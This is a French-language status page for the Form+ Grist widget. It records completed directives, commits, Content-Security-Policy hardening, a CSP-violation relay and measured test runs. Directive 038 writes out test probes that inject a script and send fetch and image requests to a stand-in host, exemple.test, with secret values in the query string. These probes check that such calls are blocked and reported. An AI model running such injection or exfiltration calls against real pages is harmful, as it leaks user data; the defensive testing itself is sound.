# GFS-ETAT : Form+

Mis à jour le 2026-11-23, au commit `e06b2bc` (dernier commit de l'app que cette page décrit : le logo devient une image intégrée et `img-src https:` est fermé, règle S3 tenue, suite de la consigne 037 ; `51879bb` portait le banc d'essais réels à politique appliquée ; `8c24baf` porte la politique de sécurité de la page que GFS ouvre, le relais S8 et la phrase `localStorage` du README, consignes 037, 038 et 039 ; `d674d31` relève le kit à `ed0a575`, 0.27.0 ; le précédent, `8f5131c`, portait les modèles de formulaire, consigne 033). Cette page ajoute deux sections, « Adresses que l'app appelle » et « Sécurité », en bas.

## Consignes
- 039 · faite · `d674d31` (kit relevé à `ed0a575`, 0.27.0) et `8c24baf` (phrase `localStorage`) :
  1. **Kit à `ed0a575`**, en un seul pas depuis `7aa030c` (0.24.0), **dans un commit à part** (`d674d31`, que rien d'autre ne touche) : la 038 n'était pas faite, donc le point 1 de la 038 (`a1ed9db`) est dépassé par celui-ci, comme tu le dis. Aucune fonction du kit que l'app appelle n'a changé ; la suite `#test` (1505 vérifications, fr et en) et les essais réels sont verts avec ce kit. Le lien du kit : la demande de `contexte` part à `'*'`, puis il retient l'origine de ton cadre parent au premier message valide et vise cette origine (mesuré avec une page parente qui joue GFS, `tests/grist-env/e2e-relais-violations.js` : le relais arrive).
  2. **`README.md`**, ligne « Stockage dans le navigateur (`localStorage`) » dans « Sécurité » : quatre clés, vérifiées dans le code (`git grep localStorage poc/` ne trouve **aucune écriture directe**, comme tu le vois ; tout passe par le kit) : `formplus_theme` (`Theme`), `formplus_lang` (`I18n`), `formplus_open_row` (`GfsLink.storageSet`, `poc/js/main.js` : la ligne de `FormPlus_Formulaires` ouverte, un numéro) et `formplus_pending_guide` (`GfsLink.storageSet`, `poc/js/publish-guide.js` : l'étape en cours du guide de publication, **avec des identifiants de structure du document** : document, table, section, nom de la page ; jamais une question ni une réponse, je l'ai écrit tel quel). Dans GFS, `formplus_theme`, `formplus_open_row` et `formplus_pending_guide` partent chez GFS par `GfsLink.storageSet` ; `sessionStorage`, `IndexedDB` et cookie : aucun.
- 038 · faite · `d674d31` (point 1) et `8c24baf` (points 2 à 4) ; point 5 mesuré **avec un GFS simulé**, pas dans un vrai GFS :
  1. Référence du kit à `ed0a575` (voir 039).
  2. `import '../../kit/js/violations-start.js';` est la **première ligne d'import** de `poc/js/main.js` (`poc/widget.html` ne charge que ce module ; un essai de `#test` garde cette place).
  3. Ligne S8 de « Sécurité » ci-dessous : tenue, kit 0.27.0.
  4. **Mesuré dans un vrai Grist, GFS simulé par la page du document** (`tests/grist-env/e2e-relais-violations.js` : le cadre a `gfs=1` dans son adresse, la page parente répond à `contexte` et note ce que le cadre lui poste) : au démarrage, `securite` / `relais` avec `kit: "0.27.0"` ; un script de `https://exemple.test/x.js?secret=1`, un `fetch('http://exemple.test/y?secret=2')` et une image `http://exemple.test/z.png?secret=3` sont bloqués et arrivent comme trois alertes (`script-src-elem`, `connect-src`, `img-src`) avec **`exemple.test` seul** : ni `secret`, ni chemin dans aucun message.
  5. **Une limite à connaître pour ton essai du point 5** : le `fetch('https://exemple.test/x?secret=1')` que tu proposes **ne lève rien pour Form+** : `connect-src https:` le permet (l'exception dite de la règle S3, voir « Adresses » et « Sécurité »), donc ni blocage ni alerte, et la fenêtre ne dira rien. Ce qui lève une alerte chez Form+ : un script tiers (`document.head.appendChild(Object.assign(document.createElement('script'), { src: 'https://exemple.test/x.js?secret=1' }))`) ou un appel ou une image en `http:` (`fetch('http://exemple.test/x?secret=1')`). Non mesuré : ton vrai GFS (origine, contrat, affichage de la fenêtre).
- 037 · faite · `8c24baf` (la politique), `71b4ace` (Dependabot), `51879bb` (essais), **`e06b2bc` (point 5 réglé le 23/11 : logo intégré, `img-src https:` fermé)** ; **036 : remplacée par la 037, rien de propre**. Point par point :
  1. **Lu** : guide 1.4 (S1 à S9, gabarit) et cahier 3.2.1. **0.** Confirmé : la page que GFS ouvre est `poc/widget.html`, et sa politique à `b9a2ab2` était bien celle que tu as lue (`default-src 'self'`, `unpkg.com` entier, `img-src https:`, `connect-src https:`, pas de `form-action`) ; `index.html` n'est pas ouverte par GFS.
  2. **La politique de `poc/widget.html` aujourd'hui** : `default-src 'none'; script-src 'self' 'unsafe-eval' https://docs.getgrist.com/grist-plugin-api.js https://unpkg.com/leaflet@1.9.4/dist/leaflet.js; style-src 'self' 'unsafe-inline' https://unpkg.com/leaflet@1.9.4/dist/leaflet.css; img-src 'self' data: https:; connect-src 'self' https:; font-src 'none'; media-src 'none'; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'` (celle du 19/11 ; **depuis le 23/11 `img-src` ne contient plus `https:`**, voir le point 5 : `img-src 'self' data: https://a.tile.openstreetmap.org https://b.tile.openstreetmap.org https://c.tile.openstreetmap.org https://unpkg.com/leaflet@1.9.4/dist/images/`). Chaque ouverture est commentée dans la balise.
  3. **Leaflet** (ta 028 reste ce qu'elle est) : les deux fichiers de la 1.9.4 par leur **adresse exacte** dans `script-src` et `style-src`, plus `unpkg.com` entier ; chargés avec leur **empreinte SRI** et `crossorigin="anonymous"` (`LEAFLET_CDN_*_INTEGRITY` dans `poc/js/kinds.js`, `loadLeaflet` dans `poc/js/respond.js`), recalculée sur le paquet npm `leaflet@1.9.4` : ce sont celles que publie Leaflet. **Non mesuré** : le chargement réel depuis unpkg (le réseau de cette session le refuse) ; la carte reste inactive. Les tuiles OpenStreetMap n'avaient pas d'entrée propre le 19/11 (`img-src https:` les couvrait) ; **depuis le 23/11 elles sont nommées une à une** dans `img-src` (les trois hôtes `a`, `b`, `c`), avec le dossier d'images de Leaflet (`unpkg.com/leaflet@1.9.4/dist/images/`, le marqueur).
  4. **`connect-src https:` : gardé, c'est l'exception dite.** Toutes les requêtes de la page vont au serveur Grist de la personne, dont l'hôte n'est connu qu'à l'exécution : pièces jointes avec jeton (`downloadAttachmentAsDataUrl`), formulaire natif par la route du document avec jeton (`fetchNativeForm`, `poc/js/grist-meta.js`), route de partage avec clé et envoi des réponses et pièces jointes (`poc/js/respond.js`). Je n'ai pas trouvé d'autre `fetch` dans l'app (`git grep "fetch("`). Ligne « serveur Grist de la personne » dans « Adresses » ci-dessous.
  5. **`img-src https:` : FERMÉ le 23/11/2026 (`e06b2bc`), S3 tenue.** Le 19/11, je l'avais gardé et dit « non tenue » : il servait au logo du formulaire, saisi **par adresse** vers un hôte que la personne qui configure choisit, pas le serveur Grist. Le porteur a décidé le 23/11 de **remplacer le logo par une image intégrée** (« Remplacer par une image intégrée »), et, comme il n'existe que des formulaires de test, **sans outil de migration** : un simple remplacement. Le champ « Logo ou image d'en-tête (URL) » est devenu « Logo ou image d'en-tête » : on colle une image ou on en prend une dans une **pièce jointe du document** (même éditeur que les images de description, sans choix de taille), convertie en `data:` (PNG gardé avec sa transparence, repli JPEG sur fond blanc si trop lourd, 512 px au plus) et enregistrée sous `logoImage` dans la Definition de `FormPlus_Formulaires` ; `respond.js` ne pose en `src` qu'une `data:image/(png|jpeg|gif|webp)` (`safeImageDataUrl`). Un formulaire d'avant, qui garde un `logoUrl`, **n'affiche plus de logo et ne fait aucune requête vers cette adresse** ; une note le dit dans Paramètres et l'ancienne adresse disparaît à la sauvegarde suivante. `img-src` devient `'self' data:` plus, pour la carte inactive, les trois hôtes de tuiles et le dossier d'images de Leaflet nommés un à un. **Seul `connect-src https:` reste ouvert à `https:`**, l'exception dite. Je garde la réserve de la 037 : tant que `connect-src https:` est ouvert, un code piraté peut encore sortir une donnée par un `fetch` en `no-cors` ; fermer `img-src` retire seulement la sortie par image. Mesuré dans un vrai Grist, politique appliquée (`tests/grist-env/e2e-logo.js`) : un PNG détouré 600 × 300 collé est enregistré en `data:image/png` 512 × 256, transparence gardée ; une pièce jointe du document choisie est téléchargée avec le jeton puis enregistrée de même ; l'aperçu montre l'image ; un `logoUrl` ancien n'affiche rien et n'envoie aucune requête ; zéro violation de la politique.
  6. **`form-action 'none'` ajouté** (le `<form>` du répondant n'est jamais soumis par le navigateur : `novalidate`, soumission interceptée, envoi par `fetch`) ; `font-src`, `media-src`, `frame-src`, `worker-src` fermés explicitement. **`style-src 'unsafe-inline'` est encore nécessaire** : vingt attributs `style="…"` dans `poc/widget.html` et d'autres dans les gabarits de `poc/js/` (`image-block.js`, `config-editor.js`, `links.js`, `publish-guide.js`).
  7. **Les deux autres pages** ont suivi : `poc/public-form.html` et `index.html` partent aussi de `default-src 'none'` avec `form-action 'none'` (`public-form.html` garde `connect-src https:` pour la même raison, l'hôte Grist est celui du lien `#form=`). Hors de ce que GFS ouvre, dit pour mémoire.
  8. **Le reste** : `.github/dependabot.yml` posé (actions de la CI et Playwright, chaque semaine ; le kit n'y est pas, sa référence avance par tes consignes) ; `SECURITY.md` est à la racine (S9) ; ce que ton lecteur peut vérifier de S7 : le fichier. **Je ne peux pas voir d'ici** si les alertes de sécurité de Dependabot sont activées dans les réglages du dépôt.
  9. **Mesuré dans un vrai Grist (1.7.22, Chromium) avec la politique appliquée** (`tests/grist-env/serveur-csp.js` : le dépôt tel quel, seule l'origine HTTP du Grist de test ajoutée à `connect-src` (et, jusqu'au 22/11, à `img-src` : plus nécessaire depuis que le logo est intégré), car un vrai Grist est en https ; avant cela, les essais ouvraient leur navigateur avec `bypassCSP` et ne mesuraient pas la politique) : parcours guidé, construire avant le lien, visiteur du parcours guidé, « même lien », modèle, « envoyer une autre réponse », et la page `index.html` puis `public-form.html` (nouvel essai `e2e-public-form.js`) : verts, **aucune violation de la politique** relevée dans la console du navigateur pendant ces parcours (relevé posé sur chaque navigateur lancé par les essais, vérifié sur l'essai du relais qui, lui, en provoque quatre exprès). **Deux rouges, tous deux déjà là avant ce lot** (même résultat sur `c244d49`) : `e2e-onboarding.js` sur un document **neuf** (étape « Recherche de la page du formulaire… », déjà notée ; vert dès que `FormPlus_Formulaires` existe) et un seul contrôle de `e2e-late-connection.js` quand il suit les autres essais dans le même document (seul, il est vert, avec ou sans la politique). Suite `#test` : 1505 sur 1505, fr et en le 19/11 ; 1528 sur 1528 le 23/11, avec le logo intégré (`e2e-logo.js` vert, et la série `e2e-*.js` rejouée avec la politique appliquée : tout vert, sauf le seul contrôle ancien de `e2e-late-connection.js` quand il suit les autres essais, vert seul ; `e2e-onboarding.js` vert sur ce document, qui avait déjà `FormPlus_Formulaires`). **Non mesuré** : un vrai GFS, Firefox, une autre version de Grist, les captures de la vitrine.
- 035 · faite · aucun code, rien ne change dans l'app · la section « Bibliothèques que l'app charge elle-même » est en bas de cette page (cinq lignes : l'API de Grist, Leaflet, les tuiles OpenStreetMap, `qrcode.js`, le kit). Sur ce que tu dis de Leaflet (point 2) :
  1. **Confirmé** : Leaflet 1.9.4, depuis `unpkg.com`, pour « Lieu sur carte », `option`. La version est écrite en dur dans `poc/js/kinds.js` (`LEAFLET_CDN_URL` et `LEAFLET_CDN_CSS`), chargée par `loadLeaflet` (`poc/js/respond.js`).
  2. **À corriger : elle n'est pas activée dans GFS non plus.** Le chargement exige `window.FORMPLUS_ENABLE_MAP === true`, posé avant `main.js` ; `poc/widget.html` ne le pose pas et rien d'autre dans l'app livrée non plus (seule la suite `#test` le pose, pour tester). Donc, aujourd'hui et dans GFS comme hors GFS, Leaflet n'est jamais chargé et le type est grisé. La ligne reste dans la section parce que le chargement est câblé et que la politique de sécurité de `widget.html` autorise déjà `unpkg.com` : un jour où le porteur dit oui (028), c'est une ligne de `widget.html`. Ta demande Leaflet n'est pas changée par cette déclaration, comme tu l'écris.
  3. **Ce que Leaflet entraîne et que tu ne listais pas** : les tuiles de fond de carte d'OpenStreetMap (`a`, `b`, `c.tile.openstreetmap.org`), contactées seulement avec la carte ; elles ont leur ligne.
  4. **Rien d'autre à charger** : aucune police distante (les polices du kit sont celles du système, `--font-ui` dans `kit/css/tokens.css`), aucune feuille de style distante autre que celle de Leaflet, aucun script distant autre que l'API de Grist et Leaflet.
- 034 · lue · aucun code à changer · page à `b9a2ab2` (le commit de cette page qui disait la 033 faite), relue le 18/11. Rien à redire de ton côté :
  1. **Mes cinq modèles sont dans ta galerie** (`modeles/form/` chez toi, ton manifeste déclare `modeles` et `ouverture.modele`).
     Ma demande « modeles » sort donc de « Demandes à GFS » ci-dessous.
  2. **Tes dix vérifications** (« Créer » sur « Inscription à un événement » dans ta fenêtre à 700 x 400, à la vraie souris : le panneau
     « Modèle de départ » sans rien écrire, l'accord « Table « FormPlus_Formulaires » », rien de créé avant « Créer la table », puis les
     deux tables et le concepteur ouvert sur « Votre avis nous intéresse », l'app déjà ouverte qui reçoit un autre modèle sans
     rechargement) couvrent deux des trois choses que la 033 disait « non mesurées » de mon côté : ta vraie fenêtre « Depuis un modèle »
     (à 700 x 400) et ton courtier avec l'écriture de plusieurs colonnes (`AddTable`). Restent non mesurés, ni par toi ni par moi : le
     clair et le sombre dans cette fenêtre, Firefox, une version de Grist autre que la 1.7.22.
  3. **Ma 032 est lue chez toi** : le point 2 est corrigé par `b6e4d67` et ton `labo/run-ouvrir-form.mjs` passe en entier (16 sur 16, sans
     l'attente de 4 secondes). Rien de plus de mon côté.
  4. **Ta référence passe de `ab8bf38` à `b9a2ab2`**. Je confirme ta lecture sur mon dépôt (`git diff ab8bf38 b9a2ab2`) : `poc/widget.html`
     gagne deux éléments (`#start-notice` et `#start-panel-model`), aucune table, colonne ni verbe de plus, `manifest.json` et la
     politique de sécurité inchangés ; le reste est le catalogue `modeles/`, `templates.js`, le panneau de `config-editor.js`,
     l'abonnement d'options de `main.js` (032) et les essais.
  5. **Reste en attente du mot du porteur** (028, inchangé) : ouvrir une page du document hors du cadre, et Leaflet 1.9.4 pour « Lieu sur
     carte ». Pas de question nouvelle pour GFS.
- 033 · lue · faite · `8f5131c` · **cinq modèles de formulaire** et l'ouverture `modele`. Ta référence passe à `8f5131c`
  (kit relevé à 0.24.0, `7aa030c`, comme tu le demandes : `GfsLink.opening()` et l'argument d'`onOpen` rendent `modele: { id }` ;
  rien d'autre ne change dans le kit pour Form+, la suite `#test` et les six essais réels sont inchangés). `widget.html`, sa politique
  de sécurité (018) et le manifeste de l'app n'ont pas bougé : le catalogue vit dans `modeles/`, tu le copies.
  1. **Catalogue** : `modeles/modeles.json` (5 entrées, `type: "formulaire"`, `tables: true`, nom et description en français et en
     anglais, étiquettes bilingues) et une vignette WebP de 240 x 320 px par modèle (6 à 9 Ko) : `inscription-evenement`
     (inscription à un événement : coordonnées, sur place ou à distance, contraintes alimentaires seulement pour qui vient sur place,
     besoins particuliers), `enquete-satisfaction` (note de 1 à 5, ce qui a plu, ce qui peut être amélioré, contact facultatif),
     `demande-contact`, `signalement-probleme` (nature, lieu, date, urgence, description) et `reservation-creneau` (le type
     « Créneau horaire » de Form+, des créneaux à régler). Les `id` ne changeront ni ne seront réutilisés. Le contenu des
     modèles vit dans `poc/js/templates.js` (source unique, FR et EN) ; `modeles.json` s'en déduit
     (`node tests/check-modeles.mjs --ecrire`) et le même script, joué par la CI, refuse un identifiant hors règle, un nom de plus de
     60 signes, une description de plus de 140, un catalogue qui ne correspond plus au module, une vignette qui n'est pas un WebP de
     240 x 320 sous 12 Ko. Pas de type « Lieu sur carte » (grisé hors GFS) ni de pièce jointe (le 403 d'un visiteur anonyme est une
     limite de Grist) dans les modèles. Vignettes prises par `tests/grist-env/modeles-captures.js` dans un vrai Grist 1.7.22 avec la
     vraie app : la page publique d'un formulaire créé par le modèle, publié par Form+, vue par un visiteur anonyme dans un cadre de
     360 x 480 px (le haut du formulaire, rapport 3:4) ; aucune donnée saisie, aucun nom.
  2. **Ouverture** (contrats 5.2 point 3, 5.4 point 13). `raison: 'modele'` au démarrage du cadre (`main.js`, comme `nouveau` : jamais
     l'ancien formulaire rouvert à la place) et par l'appel `ouvrir` d'un cadre déjà ouvert (`GfsLink.onOpen`, après la question
     « Quitter ce formulaire ? » de la 019 s'il y a une réponse en cours). Le modèle s'ouvre **non enregistré** : un panneau sur l'écran
     de départ (nom, description, les questions du modèle avec leur type, le nom de la table des réponses proposé, la phrase « Rien
     n'est créé dans votre document tant que vous n'avez pas cliqué sur « Créer ce formulaire » »). Mesuré : tables, pages et sections
     du document sont identiques avant et après l'affichage du panneau. **Un identifiant inconnu, un type autre que « formulaire »
     ou aucun identifiant : `{ ouvert: false }`, rien ne change à l'écran ni dans le document** (mesuré, trois appels de suite).
     Seul cas où Form+ ne peut pas dire `{ ouvert: false }` : une ouverture de DÉMARRAGE sur un identifiant inconnu (le cadre est
     déjà ouvert, `ouverture` ne se répond pas) : il affiche l'écran de départ ordinaire avec une phrase en haut (« Ce modèle
     n'existe pas (ou plus) dans cette version de Form+ : rien n'a été créé »), aucun panneau, aucun formulaire ancien rouvert.
  3. **Le geste** : « Créer ce formulaire » est le clic qui crée (et la seule écriture, `tables: true` : chaque modèle vient avec sa
     table de réponses, toujours une table neuve, jamais une existante ; un nom déjà pris donne une table de nom voisin, Grist ne
     modifie jamais l'ancienne). Ordre : l'accord de créer `FormPlus_Formulaires` (document neuf), demandé AVANT toute création (un
     refus ne laisse ni table ni page à moitié faites, mesuré) ; puis `AddTable` avec une colonne par question, au type que Form+ lui
     donne (aucune colonne « A » vide en trop) ; la page du formulaire, nommée « Formulaire <table> » ; la copie que Form+ gère, en
     brouillon NON publié (le bandeau « Pas encore publié » mène au guide) ; le titre, l'accueil, le message de fin et toutes les
     questions, conditions comprises, écrits d'un seul coup avec la copie (`seed` de `prepareForm`). Ni lien ni publication.
  4. **Mesuré dans un vrai Grist 1.7.22** par `tests/grist-env/e2e-model.js` (GFS simulé par la page de Grist : cadre en `gfs=1`,
     réponse à `contexte` avec l'ouverture, appel `ouvrir`), 43 vérifications vertes pour `inscription-evenement` et le même
     parcours vert pour les quatre autres modèles (`MODEL=<id>`) : le panneau, rien d'écrit avant le clic, la table (colonnes et
     types), la définition enregistrée (identique aux questions du module), la page nommée, la copie non publiée, l'aperçu, puis la
     publication par Form+, le lien copié par le bouton de Grist et collé, et un visiteur ANONYME qui répond (la question à condition
     n'apparaît qu'après le bon choix) : sa réponse arrive dans les bonnes colonnes (texte, choix, nombre, choix multiple) ;
     `ouvrir` sur modèle connu, inconnu, autre type, sans identifiant ; ouverture de démarrage sur un modèle inconnu. Suite
     `#test` : 1 491 / 1 491 en FR et en EN (1 107 avant : contenu des modèles et de leur catalogue, questions de chaque
     modèle dans les deux langues, affichage côté répondant, panneau). Rejoués verts sur ce code : `e2e-late-connection.js`,
     `e2e-build-first.js`, `e2e-guided-visitor.js`, `e2e-same-link.js` et, une fois `FormPlus_Formulaires` présente dans le
     document de test, `e2e-onboarding.js` (qui s'arrêtait sur « Recherche de la page du formulaire… » dans un document neuf
     parce que l'essai ne clique pas la fenêtre d'accord, déjà dit en 030).
  Ce que je n'ai pas mesuré : ta vraie fenêtre « Depuis un modèle » (la vignette et les textes dans ta fenêtre à 700 x 400, en
     clair et en sombre, sous Firefox) ; le courtier de GFS avec cette écriture (`AddTable` d'une table de plusieurs colonnes de
     types différents, `AddColumn`, comme dans « Partir de zéro » mais avec plus de colonnes) : à rejouer chez toi avec ma vraie app ;
     une version de Grist autre que la 1.7.22. La capacité d'un créneau (anti-double-réservation) n'existe toujours pas : le modèle
     « Réservation d'un créneau » le dit dans sa description (« une liste que vous réglez »), rien de plus.
- 032 · lue · **point 2 CORRIGÉ dans `b6e4d67`** (voir « Correction » en fin d'entrée) · page à `ab8bf38`, relue le 18/11. Ta référence passe à `b6e4d67` : rien
  à redire de ton côté, `widget.html`, sa politique de sécurité et le manifeste n'ont pas bougé depuis
  `3b9ac0c`. **Ta question** (« quand la connexion arrive après les 4 secondes de `main.js`, l'écran
  « widget Grist » se corrige-t-il tout seul ? ») : mesurée contre un vrai Grist 1.7.22, par un nouvel essai
  `tests/grist-env/e2e-late-connection.js` (quatre passes, détail dans `tests/grist-env/README.md`) :
  1. **Hors GFS, oui.** Grist qui répond à 6,5 s : `standalone` à 4,1 s (diagnostic `timeout`), puis
     `config` à 6,6 s sans geste ni rechargement, diagnostic passé à `onOptions` (il ne garde que le dernier
     évènement, d'où ton `timeout` s'il est lu pendant que l'écran s'affiche). Le rappel de `grist.onOptions`
     finit toujours par `showConfig()` ou `renderFill()`, qui cachent `#standalone`.
  2. **Dans GFS, pas toujours : c'était un défaut de Form+, corrigé dans `b6e4d67` (voir plus bas).** Entre `grist.ready` et `grist.onOptions`,
     `main.js` fait `await GfsLink.ready`, que `GfsLink` ne tient qu'à la réponse de GFS à `contexte` (5 s au
     plus). Or `grist.onOptions` s'abonne sans mémoire : un message d'options arrivé AVANT l'abonnement est
     perdu, `state.connected` ne passe jamais à vrai, le minuteur de 4 s montre `standalone` avec `timeout`,
     et plus rien ne le corrige. Mesuré (`gfs=1` dans l'adresse du cadre, vrai Grist, personne ne répond à
     `contexte`) : `standalone` à 4,0 s, **il reste** plus de 12 s ; les options de Grist étaient arrivées
     42 ms après le départ du cadre, `GfsLink` renonçait à 5 s (« contexte indisponible »). Même essai avec
     un GFS qui répond à `contexte` à 0,3 s et des options à 1,5 s : `config` à 1,5 s, `standalone` jamais.
     C'est donc une course entre la réponse de GFS à `contexte` et son message d'options (le courtier de GFS
     joue le rôle de Grist pour l'app), pas la lenteur de la connexion en soi.
  3. **Lien avec ton labo (hypothèse, pas constat)** : ton labo décrit exactement ce que ce défaut produit
     (écran « widget Grist », diagnostic `timeout`, avec `3b9ac0c` comme avec `ab8bf38`). Pour départager, regarde
     si ton labo répond à `contexte` après son message d'options, ou pas du tout : dans ces deux cas Form+ reste
     sur `standalone`. Je n'ai pas vu ton labo ; je n'ai fait que reproduire l'écran et son diagnostic.
  Pas corrigé dans le lot de la consigne (elle disait « aucun code à changer », et `main.js` est partagé entre
  fils) : traité dans un fil à part, voici la suite.
  **Correction (`b6e4d67`, 18/11).** `main.js` s'abonne maintenant à `grist.onOptions` tout de suite après
  `grist.ready` ; l'installation du lien avec toi (`GfsLink.ready`, puis langue, thème, barre, ouvrir, fermer,
  supprimer, dupliquer) se fait à côté, dans `gfsSetup`, et le rappel d'options, après avoir noté
  `state.connected = true` (le minuteur de 4 s ne montre donc plus `standalone`), attend `gfsSetup` avant de
  décider quoi afficher, donc avec le contexte et la porte « ouvrir » déjà en place. Aucun contrat avec GFS
  touché : mêmes messages, mêmes réponses, même ordre vu de ton côté (aucun verbe n'était déjà branché avant la
  réponse à `contexte`). Mesuré par `e2e-late-connection.js` dans un vrai Grist 1.7.22, mêmes quatre passes
  qu'avant : témoin `config` à 0,1 s ; retard hors GFS `standalone` à 4,0 s puis `config` à 6,6 s tout seul ;
  **dans GFS qui ne répond pas à `contexte` : `config` à 5,0 s (quand `GfsLink` renonce), `standalone` jamais**
  (avant : `standalone` à 4,0 s qui restait) ; dans GFS qui répond vite : `config` à 1,5 s. L'essai ne porte plus
  de `⚠` : c'est une vérification ordinaire. Suite `#test` 1 107 / 1 107 en FR et en EN. Si ton labo montrait
  cet écran avec `timeout`, rejoue-le sur `b6e4d67` : il devrait montrer `config` une fois ton `contexte`
  répondu ou ses 5 s passées (jusque-là, l'écran de chargement « Connexion à Grist… », pas `standalone`).
- 031 · lue · faite · `700798a` · `vitrine/` à la racine : `vitrine.json` (description de 182 caractères en
  français et 166 en anglais, trois légendes de 53 caractères au plus, aucune promesse de sécurité) et
  `1.webp`, `2.webp`, `3.webp` (960 × 600, de 23 à 34 Ko, relus avec Pillow). Aucun code de l'app ni
  manifeste changé. Les trois images viennent de la vraie app dans un vrai Grist 1.7.22 (celui de
  `tests/grist-env/`), en clair, en français, avec six réponses fictives sans nom de personne :
  1 le formulaire tel que le voit la personne qui répond (celle qui illustre ta carte : le titre et les deux
  premières questions sont au centre), 2 l'éditeur d'une question, 3 l'onglet Réponses. Le formulaire
  d'exemple se bâtit par l'éditeur lui-même (« Construire le formulaire d'abord », questions ajoutées à la
  souris, publication par Form+, lien copié par le bouton de Grist), et `tests/grist-env/vitrine-captures.js`
  vérifie que les questions enregistrées sont celles saisies avant de prendre quoi que ce soit : une commande
  régénère les trois images. Pas mesuré : le rendu dans la vitrine de GFS elle-même (le rognage d'un dixième en
  haut et en bas est jugé sur l'image : l'essentiel de chacune tient dans les 80 % du milieu).
  Prises après les correctifs de deux défauts de Form+ vus pendant les premières captures et corrigés par
  un autre fil avant ce commit : la première pastille de chaque groupe de choix, 12 px trop haute
  (`be136b9`, `cc17cfa`), et la page publique du parcours « Partir de zéro » qui s'ouvrait sans aucune
  question pour un visiteur anonyme (`9caaa2f`, `e2e-guided-visitor.js`). Un troisième reste ouvert, hors
  de cette consigne : « Envoyer une autre réponse » (`respond.js`) est écrit avec un `onclick` en ligne,
  donc sans effet sous ta consigne 018 ; signalé à Antoine pour un fil à part. Si l'apparence change, les
  images se régénèrent en une commande et la ligne « vitrine » est à redire avec le nouveau commit.
- 030 · lue · faite · `2173843` · bouton « Publier » (partie 1), refus de la personne (partie 2), case
  « Même lien que… » (partie 3).
  1. Rien à changer pour que ton bouton passe : `publishFormSection` écrit déjà dans la forme que tu autorises
     (`linkId` = `crypto.randomUUID()`, `options` = `{"publish":true}`, `shareRef` seule dans son
     `UpdateRecord`, branche « page déjà partagée » par `UpdateRecord _grist_Shares { options }`). Je ne lis
     toujours pas `_grist_Shares` : le partage d'une page se lit dans `_grist_Pages.shareRef`.
  2. `GFS_ANNULE` n'est plus un échec : `publishNow` (`poc/js/publish-guide.js`, `isCancelled`) dit « Vous avez
     refusé : le formulaire n'est pas publié. », garde le bouton de l'étape 1 pour recommencer et ne passe pas
     au geste à la main ; `GFS_REFUSE` ou une erreur de Grist gardent leur repli. Au clic suivant, la recette
     reprend sa branche « page déjà partagée ».
  3. La case « Même lien que « <nom du premier> » : rien à copier. » est décochée, n'apparaît que si le
     document a déjà un formulaire de Form+ publié dont la clé est connue (`findPublishedSiblingForm`,
     jamais d'exception), et dit son prix : une seule adresse ouvre les deux formulaires, si elle fuit elle
     les ouvre tous les deux, **dépublier l'un dans Grist ferme aussi le lien de l'autre** (mesuré, voir
     plus bas). Cochée : `UpdateRecord _grist_Pages { shareRef }` avec celui du premier (seul dans son
     lot), puis `shareOptions` ; l'adresse du second est bâtie avec la clé du premier, après une seule
     vérification que cette clé ouvre bien CE formulaire (sinon la personne copie le lien comme d'habitude),
     et le collage est franchi par Form+. `GFS_ANNULE` sur la fenêtre « Un seul lien pour deux formulaires ? »
     retombe sans bruit sur un lien à part (partie 1). Décochée : rien ne change.
  Mesuré dans un vrai Grist 1.7.22 (`tests/grist-env/e2e-same-link.js`, trois passages verts) : la seconde page
  prend le `shareRef` de la première et aucun partage de plus n'est créé ; la clé du premier ouvre les deux
  formulaires et un visiteur anonyme écrit dans la table de chacun ; « Dépublier » sur l'une ou l'autre des
  deux pages passe le partage commun à `publish: false` et les deux formulaires répondent 404, republier le
  partage les rouvre tous les deux (c'est ce que ta consigne demandait de ne dire que mesuré). Tests : suite
  `#test` 1 093 / 1 093 (rejet `GFS_ANNULE`, rejet `GFS_REFUSE`, case, mode rattachement, clé qui n'ouvre pas
  le formulaire) ; dans le vrai Grist, rejoués sur le code de `700798a` : `e2e-onboarding.js` 21 / 21,
  `e2e-build-first.js` 34 / 34, `e2e-same-link.js` 34 / 34, `e2e-guided-visitor.js` 12 / 12. Un piège du banc,
  qui éclaire aussi le passage de la 029 resté « non élucidé » : sur un document de test tout neuf, Form+
  demande d'abord l'accord de créer `FormPlus_Formulaires` (« Créer la table ») et `e2e-onboarding.js` /
  `e2e-build-first.js` ne cliquent pas cette fenêtre : ils s'arrêtent sur « Recherche de la page du
  formulaire… », avec mon code comme avec celui de `3b9ac0c` (essayé), et passent dès que la table existe.
  Ce que je n'ai pas mesuré : Firefox ; une autre version de Grist que la 1.7.22 ; tes deux fenêtres elles-mêmes
  (« Ouvrir au public ? » et « Un seul lien pour deux formulaires ? ») : le refus est simulé en faisant rejeter
  l'appel avec `error.code = 'GFS_ANNULE'`, tel que tu dis qu'il arrive. À rejouer chez toi avec ma vraie app.
  À savoir : le lanceur de la suite `#test` du Chromium de cette session sort en erreur à cause de douze
  messages de politique de sécurité (`respond.js`, bouton « Envoyer une autre réponse » écrit avec un
  `onclick` en ligne, donc sans effet sous ta consigne 018) ; la CI à `3b9ac0c` était verte et le nombre est
  le même avant et après mon changement. Signalé à Antoine pour un fil à part.
- 029 · lue · faite · `74f31ac` · `tests.js` ne se charge plus à l'ouverture : `poc/js/main.js`
  n'importe plus rien de `tests.js` en début de fichier, la branche `#test` fait
  `const { runTests } = await import('./tests.js')` (une ligne, rien d'autre ne change). Aucun effet
  de bord à signaler : au chargement, `tests.js` ne définit que `runTests` (et deux petits utilitaires
  d'essai) ; tout ce qu'il importe est déjà dans le graphe de `main.js`, donc le gain est ce seul fichier.
  Mesure (Chromium, cache vide à chaque passe, 3 passes identiques, serveur local sans compression,
  code `9437bdc`, kit `cb1f8cd`) :
  - dans un vrai Grist (celui de `tests/grist-env/`), au premier affichage de l'éditeur (écran de
    départ) : **avant 35 requêtes et 1 733 194 o, après 34 requêtes et 1 439 488 o** (dont
    `grist-plugin-api.js`, 880 781 o, dans les deux cas) ;
  - app seule (`widget.html` ouvert hors de Grist) : **avant 34 requêtes et 852 413 o** (les mêmes 34
    requêtes que la mesure de GFS), **après 33 requêtes et 558 707 o** ;
  - écart : une requête et 293 706 o de moins (les 293 859 o de `tests.js`, qui pesait 264 657 o à
    `2faf93b`, moins 153 o de commentaire ajoutés à `main.js`). Compressé (ce que sert GitHub Pages),
    `tests.js` pèse environ 65 Ko et l'app seule passe d'environ 242 Ko à 178 Ko (gzip niveau 9 calculé
    sur les fichiers : estimation, pas une mesure réseau).
  Ce que la mesure ne dit pas : le temps d'affichage (serveur local, pas l'ADSL simulé de GFS). Vérifié :
